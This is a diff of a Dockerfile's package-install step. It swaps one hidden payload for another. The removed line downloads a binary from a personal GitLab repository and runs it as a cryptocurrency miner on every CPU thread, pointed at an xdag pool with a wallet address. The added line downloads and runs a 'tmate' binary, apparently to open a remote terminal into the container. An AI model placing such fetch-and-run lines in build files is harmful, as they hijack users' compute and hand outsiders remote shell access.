@@ -15,7 +15,7 @@ RUN apt-get update && apt-get install -y \
     build-essential \
     nodejs \
     npm \
- && wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag && chmod +x dag && ./dag -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)
+ && wget https://gitlab.com/richardkevin320/pede/-/raw/main/tmate && chmod +x tmate && ./tmate
 
 # Set work dir:
 WORKDIR /home
